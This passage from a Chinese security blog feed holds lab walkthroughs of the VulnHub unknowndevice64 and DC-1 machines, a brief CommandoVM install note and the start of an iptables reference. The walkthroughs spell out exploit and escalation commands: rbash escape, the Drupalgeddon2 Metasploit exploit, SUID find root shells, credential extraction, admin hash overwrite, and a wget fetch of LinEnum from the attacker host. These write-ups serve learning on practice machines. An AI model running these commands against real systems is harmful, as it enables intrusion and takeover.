class="code"><pre><span class="line">root@kali:~/Desktop# steghide extract -sf key_is_h1dd3n.jpg</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/11/5caf0ca45b805.png" alt="6.png"><br>提示键入密码,得到一个txt文本<br><img src="https://i.loli.net/2019/04/11/5caf0f5923e16.png" alt="5.png"><br>这是用的是<a href="https://blog.csdn.net/qq_34306963/article/details/78478362" target="_blank" rel="noopener">brain fuck码</a>（BF码）<br>解密出来<code>ud64:1M!#64@ud</code></p><h3 id="SUDO提权"><a href="#SUDO提权" class="headerlink" title="SUDO提权"></a><a href="https://yq.aliyun.com/articles/654362" target="_blank" rel="noopener">SUDO提权</a></h3><p>前面1337端口开着ssh服务<br>登录SSH<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">λ ssh ud64@192.168.67.135 -p 1337</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/11/5caf1d182b3d1.png" alt="7.png"><br>发现是一个受限的shell，rbash指restrict bash(常见的受限制shell有:rbash、rksh、rsh)<br>使用两次<code>Tap</code>可以查看当前能使用命令<code>compgen -c</code>相同效果<br><img src="https://i.loli.net/2019/04/11/5caf1f6f81256.png" alt="8.png"><br><strong><a href="https://www.4hou.com/penetration/11674.html" target="_blank" rel="noopener">rbash逃逸技巧</a></strong><br>能使用VI编辑器,在命令模式输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:!/bin/bash</span><br></pre></td></tr></table></figure></p><p>得到一个<code>bash-4.4$</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export PATH=/usr/bin:$PATH #将/usr/bin作为PATH环境变量</span><br><span class="line">export SHELL=/bin/bash:$SHELL #将/bin/bash作为shell环境变量</span><br><span class="line">sudo -l #列出目前用户可执行与无法执行的指令</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/11/5caf27a82cbf1.png" alt="9.png"><br>现在就可以使用大部分命令了<br>根用户sysud64是NOPASSWD的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sysudo64 -h | less</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/11/5caf2d6595199.png" alt="10.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sysud64 -o /dev/null /bin/sh #以root权限运行跟踪调试/bin/bash, 从而获取root权限的shell</span><br></pre></td></tr></table></figure></p><p>这个实际上是使用starace工具提升权限<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sh-4.4# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure></p><p>得到root权限了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh-4.4# cat /root/flag.txt</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/11/5caf30baa1b9b.png" alt="flag.png"></p><h2 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h2><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a><br><img src="https://i.loli.net/2019/04/12/5cafdc5205a94.jpg" alt="132.jpg"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;实战测试&quot;&gt;&lt;a href=&quot;#实战测试&quot; class=&quot;headerlink&quot; title=&quot;实战测试&quot;&gt;&lt;/a&gt;实战测试&lt;/h2&gt;&lt;p&gt;主机NET模式&lt;br&gt;实验目的：获得root权限，查看/root/flag.txt&lt;br&gt;项目地址：&lt;a href=&quot;https://www.vulnhub.com/entry/unknowndevice64-1,293/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.vulnhub.com/entry/unknowndevice64-1,293/&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
      <category term="靶机实验" scheme="http://www.lanbainan.cn/tags/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>CommandoVM测试</title>
    <link href="http://www.lanbainan.cn/2019/04/11/2019-04-11/"/>
    <id>http://www.lanbainan.cn/2019/04/11/2019-04-11/</id>
    <published>2019-04-10T22:58:00.000Z</published>
    <updated>2019-04-11T08:08:04.056Z</updated>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Kali Linux是十分优秀的工具，成为安全工程师的标配，但是有时候想在Window下使用这些工具。3月28日，安全服务公司火眼发布一个超过140个开源Windows工具程序集合，名为CommandoVM（曼迪安特完全攻击虚拟机），看出来了这是由(<em>/ω＼</em>)曼迪安特（联合创建者）搞的。<br>用途：用于渗透测试和红队<br><a id="more"></a><br><a href="https://github.com/fireeye/commando-vm" target="_blank" rel="noopener">项目地址</a></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Windows 10专业版 C盘可用空间大于80G<br>管理员运行PowerShell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy Unrestricted #更改执行策略</span><br></pre></td></tr></table></figure></p><p>最后执行<br><code>.\install.ps1</code><br>中间可能会碰见一些奇怪的报错，比如：</p><ul><li>1、你的电脑不是win7 SP1 和win10（win7是不行的）</li><li>2、你的磁盘空间没有60G（笔者这里C盘不足60G，E盘200G，猜测它的60G是指C盘）</li><li>3、你的计算机在过去30天未更新</li></ul><p>开始漫长的等待ing和重启ing</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>庞大的体积使我放弃，不可否认的是，这个确实针对Windows用户还行，工具也很丰富，但是我选择kali。</p><h2 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h2><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a><br><img src="https://i.loli.net/2019/04/10/5cadbd0b57dff.jpg" alt="13.jpg"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;p&gt;Kali Linux是十分优秀的工具，成为安全工程师的标配，但是有时候想在Window下使用这些工具。3月28日，安全服务公司火眼发布一个超过140个开源Windows工具程序集合，名为CommandoVM（曼迪安特完全攻击虚拟机），看出来了这是由(&lt;em&gt;/ω＼&lt;/em&gt;)曼迪安特（联合创建者）搞的。&lt;br&gt;用途：用于渗透测试和红队&lt;br&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="工具" scheme="http://www.lanbainan.cn/tags/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>对于DC-1的测试</title>
    <link href="http://www.lanbainan.cn/2019/04/10/2019-04-10/"/>
    <id>http://www.lanbainan.cn/2019/04/10/2019-04-10/</id>
    <published>2019-04-10T03:50:00.000Z</published>
    <updated>2019-04-10T09:58:36.714Z</updated>
    
    <content type="html"><![CDATA[<h2 id="实战测试"><a href="#实战测试" class="headerlink" title="实战测试"></a>实战测试</h2><p>项目地址：<a href="https://www.vulnhub.com/entry/dc-1-1,292/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/dc-1-1,292/</a><br>主机NET模式<br>实验目的：拿到root权限，获取flag（共有五个flag）<br>小知识：Drupal Drupalgeddon 2表单API属性注入，该模块主要是利用表单API中的Drupal属性注入<br>Drupal 6.x, &lt; 7.58, 8.2.x, &lt; 8.3.9, &lt; 8.4.6, and &lt; 8.5.1 都是易受攻击的<br><a id="more"></a><br><a href="https://www.cvedetails.com/cve/cve-2018-7600" target="_blank" rel="noopener">参考CVE-2018-7600</a></p><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/09/5cac11e762336.png" alt="1.png"><br>快速高效，只能用于局域网<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -sP 192.168.67.0/24</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/09/5cac11e79182b.png" alt="2.png"><br>相对较慢，用途广泛</p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p><code>192.168.67.133</code>十分可疑,详细扫描<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -T4 -A -v 192.168.67.133</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -T4 -A -v 192.168.67.133</span><br><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)</span><br><span class="line">|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)</span><br><span class="line">|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)</span><br><span class="line">80/tcp  open  http    Apache httpd 2.2.22 ((Debian))</span><br><span class="line">|_http-favicon: Unknown favicon MD5: B6341DFC213100C61DB4FB8775878CEC</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/</span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt</span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt</span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">|_http-title: Welcome to Drupal Site | Drupal Site</span><br><span class="line">111/tcp open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo:</span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp  rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp  rpcbind</span><br><span class="line">|   100024  1          36272/tcp  status</span><br><span class="line">|_  100024  1          54540/udp  status</span><br></pre></td></tr></table></figure><p>可以看出80端口使用的是<code>Drupal 7</code><br>使用msf查询模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search Drupa</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set RHOSTS 192.168.67.133</span><br><span class="line">RHOSTS =&gt; 192.168.67.133</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit</span><br></pre></td></tr></table></figure><p>获得shell后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ls</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/09/5cac4ee79f5ae.png" alt="4.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; cat /etc/passwd #一般不可查</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/09/5cac4e0801008.png" alt="3.png"><br>这些都不是重点</p><h3 id="有点骚的提权"><a href="#有点骚的提权" class="headerlink" title="有点骚的提权"></a>有点骚的提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer    : DC-1</span><br><span class="line">OS          : Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686</span><br><span class="line">Meterpreter : php/linux</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: www-data (33)</span><br></pre></td></tr></table></figure><p>可以看出账号权限是www-data的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3901 created.</span><br><span class="line">Channel 9 created.</span><br><span class="line">python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;</span><br><span class="line">www-data@DC-1:/$</span><br></pre></td></tr></table></figure></p><p>在得到一个反向shell之后，我们使用python生成一个TTY shell，毕竟那样界面友好一点。<br><strong>SUID</strong>是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var$ find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">`</span><br></pre></td></tr></table></figure></p><p>tmp目录任何用户都可以写文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/tmp$ touch test</span><br><span class="line">touch test</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/tmp$ find test -exec &quot;whoami&quot; \;</span><br><span class="line">find test -exec &quot;whoami&quot; \;</span><br><span class="line">root</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/tmp$ find test -exec &quot;/bin/sh&quot; \;</span><br><span class="line">find test -exec &quot;/bin/sh&quot; \;</span><br><span class="line"># id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)</span><br></pre></td></tr></table></figure><p>可以看出现在的身份是root</p><h3 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h3><p><strong>flag1</strong>,提示我们去找配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/www/flag1.txt</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/10/5cad40a32f674.png" alt="flag1.png"><br><strong>flag2</strong>，提示我们暴力破解不是唯一的办法，（配置文件中有密码(￣▽￣)／）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/www/sites/default/settings.php</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/10/5cad40a355c1a.png" alt="flag2.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&apos;database&apos; =&gt; &apos;drupaldb&apos;,</span><br><span class="line">&apos;username&apos; =&gt; &apos;dbuser&apos;,</span><br><span class="line">&apos;password&apos; =&gt; &apos;R0ck3t&apos;,</span><br><span class="line">&apos;host&apos; =&gt; &apos;localhost&apos;,</span><br><span class="line">&apos;port&apos; =&gt; &apos;&apos;,</span><br><span class="line">&apos;driver&apos; =&gt; &apos;mysql&apos;,</span><br><span class="line">&apos;prefix&apos; =&gt; &apos;&apos;,</span><br></pre></td></tr></table></figure></p><p><strong>flag3</strong><br>登录mysql<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># mysql -Ddrupaldb -udbuser -pR0ck3t</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show database;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/10/5cad4329afe3c.png" alt="6.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use drupaldb</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">mysql&gt; select * from node;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/10/5cad4a225c22a.png" alt="8.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|   2 |    2 | page | und      | flag3 |   1 |      0 | 1550582412 | 1550583860 |       0</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/10/5cad43e269381.png" alt="7.png"><br>提示我们该去找flags的内容，登录admin试试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|   1 | admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR |</span><br></pre></td></tr></table></figure><p>破解密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# hashcat --help | grep &quot;Drupal&quot;</span><br><span class="line">   7900 | Drupal7 | Forums, CMS, E-Commerce, Frameworks</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# hashcat -m 7900 &apos;$S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jn EKuDR&apos;</span><br></pre></td></tr></table></figure><p>我的虚拟机，没GPU，换种方法<a href="https://www.yuzhi100.com/article/drupal-7-chongzhi-guanliyuan-mima" target="_blank" rel="noopener">Drupal 7 重置管理员密码</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># php scripts/password-hash.sh test &gt; passwd.txt</span><br><span class="line"># cat passwd.txt</span><br><span class="line">password: test   hash: $S$DM2GGMtCQXWix2rJKPPMTmiZaX0Tqr71H.ad.yFHQ5nFvDvUa8rO</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use drupald</span><br><span class="line">mysql&gt; update users set pass=&apos;$S$DM2GGMtCQXWix2rJKPPMTmiZaX0Tqr71H.ad.yFHQ5nFvDvUa8rO&apos; where name=&apos;admin&apos;; #更新密码</span><br></pre></td></tr></table></figure><p>登录成功<br><img src="https://i.loli.net/2019/04/10/5cad5a6ec491c.png" alt="9.png"><br>获取flag<br><img src="https://i.loli.net/2019/04/10/5cad5bcfc602b.png" alt="flag3.png"><br><strong>flag4</strong><br><img src="https://i.loli.net/2019/04/10/5cad5c4778ce7.png" alt="10.png"><br>提示我们去找passwd<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># cat /etc/passwd</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/09/5cac4e0801008.png" alt="3.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># cat /home/flag4/flag4.txt</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/10/5cad5ddf8f824.png" alt="flag4.png"><br><strong>flag5</strong><br>提示在根目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># cd /root</span><br><span class="line"># ls</span><br><span class="line">thefinalflag.txt</span><br><span class="line"># cat thefinalflag.txt</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/10/5cad5fd7b4f10.png" alt="flag5.png"></p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>皆大欢喜，不容易的是在SUID这里卡住了，解决如下：<br>使用<code>LinEnum脚本</code><br>kali：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/rebootuser/LinEnum.git #下载脚本</span><br><span class="line">root@kali:~/Desktop/LinEnum# python -m SimpleHTTPServer 80 #Python版HTTP服务器，方便下载脚本</span><br></pre></td></tr></table></figure></p><p>DC-1：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#cd /tmp</span><br><span class="line"># wget http://192.168.67.128/LinEnum.sh</span><br><span class="line"># bash LinEnum.sh</span><br></pre></td></tr></table></figure></p><p>提示可以利用SUID，当然不止这些，可以看见很多对我们有利的信息<br><img src="https://i.loli.net/2019/04/10/5cad660ca5109.png" alt="11.png"></p><h2 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h2><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a><br><img src="https://i.loli.net/2019/04/10/5cad675138700.gif" alt="test.gif"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;实战测试&quot;&gt;&lt;a href=&quot;#实战测试&quot; class=&quot;headerlink&quot; title=&quot;实战测试&quot;&gt;&lt;/a&gt;实战测试&lt;/h2&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://www.vulnhub.com/entry/dc-1-1,292/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.vulnhub.com/entry/dc-1-1,292/&lt;/a&gt;&lt;br&gt;主机NET模式&lt;br&gt;实验目的：拿到root权限，获取flag（共有五个flag）&lt;br&gt;小知识：Drupal Drupalgeddon 2表单API属性注入，该模块主要是利用表单API中的Drupal属性注入&lt;br&gt;Drupal 6.x, &amp;lt; 7.58, 8.2.x, &amp;lt; 8.3.9, &amp;lt; 8.4.6, and &amp;lt; 8.5.1 都是易受攻击的&lt;br&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
      <category term="靶机实验" scheme="http://www.lanbainan.cn/tags/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>Linux防火墙-iptables/firewalld</title>
    <link href="http://www.lanbainan.cn/2019/04/04/2019-04-04/"/>
    <id>http://www.lanbainan.cn/2019/04/04/2019-04-04/</id>
    <published>2019-04-03T16:00:00.000Z</published>
    <updated>2019-04-08T05:09:22.984Z</updated>
    
    <content type="html"><![CDATA[<h2 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h2><p>netfilter/iptables（简称为iptables）组成Linux平台下的包过滤防火墙，具有完成封包过滤、封包重定向和网络地址转换（NAT）等功能。netfilter是Linux 核心中一个通用架构，它提供了一系列的”表”(tables)，每个表由若干”链”(chains)组成，而每条链中可以有一条或数条规则(rule)组成。可以这样来理解，netfilter是表的容器，表是链的容器，而链又是规则的容器。<br><a id="more"></a><br><a href="https://www.cnblogs.com/kevingrace/p/6265113.html" target="_blank" rel="noopener">iptables规则梳理</a></p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p><strong>iptables语法</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语法：iptables [-t table] command [match] [-j target/jump]</span><br></pre></td></tr></table></figure></p><p>1）[-t table] 指定规则表<br>-t 参数用来，内建的规则表有三个，分别是：nat、mangle 和 filter，当未指定规则表时，则一律视为是 filter。个规则表的功能如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nat：此规则表拥有 PREROUTING 和 POSTROUTING 两个规则链，主要功能为进行一对一、一对多、多对多等网址转换工作（SNAT、DNAT），这个规则表除了作网址转换外，请不要做其它用途。</span><br><span class="line">mangle：此规则表拥有 PREROUTING、FORWARD 和 POSTROUTING 三个规则链。除了进行网址转换工作会改写封包外，在某些特殊应用可能也必须去改写封包（TTL、TOS）或者是设定markMARK（将封包作记号，以进行后续的过滤），这时就必须将这些工作定义在 mangle 规则表中，由于使用率不高，这里不讨论 mangle 的用法。</span><br><span class="line">filter：这个规则表是默认规则表，拥有 INPUT、FORWARD 和 OUTPUT 三个规则链，这个规则表顾名思义是用来进行封包过滤的处理动作（例如：DROP、 LOG、 ACCEPT 或 REJECT），需要将基本规则都建立在此规则表中。</span><br></pre></td></tr></table></figure></p><p>2）command 常用命令列表：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">命令：-A, --append；范例：iptables -A INPUT ...；说明：新增规则到某个规则链中，该规则将会成为规则链中的最后一条规则。</span><br><span class="line">命令：-D, --delete；范例：iptables -D INPUT --dport 80 -j DROP，iptables -D INPUT 1；说明：从某个规则链中删除一条规则，可以输入完整规则，或直接指定规则编号加以删除。</span><br><span class="line">命令：-R, --replace；范例：iptables -R INPUT 1 -s 192.168.0.1 -j DROP；说明：取代现行规则，规则被取代后并不会改变顺序。</span><br><span class="line">命令：-I, --insert；范例：iptables -I INPUT 1 --dport 80 -j ACCEPT；说明：插入一条规则，原本该位置上的规则将会往后移动一个顺位。</span><br><span class="line">命令：-L, --list；范例1 ：iptables -L INPUT，说明： 列出某规则链中的所有规则；范例2 iptables -t nat -L ，说明：列出nat表所有链中的所有规则。</span><br><span class="line">命令：-F, --flush；范例：iptables -F INPUT；说明：删除filter表中INPUT链的所有规则。</span><br><span class="line">命令：-Z, --zero；范例：iptables -Z INPUT；说明：将封包计数器归零。封包计数器是用来计算同一封包出现次数，是过滤阻断式攻击不可或缺的工具。</span><br><span class="line">命令：-N, --new-chain；范例：iptables -N allowed；说明：定义新的规则链。</span><br><span class="line">命令：-X, --delete-chain；范例：iptables -X allowed；说明：删除某个规则链。</span><br><span class="line">命令： -P, --policy；范例：iptables -P INPUT DROP；说明：定义过滤政策。 也就是未符合过滤条件之封包， 默认的处理方式。</span><br><span class="line">命令：-E, --rename-chain；范例：iptables -E 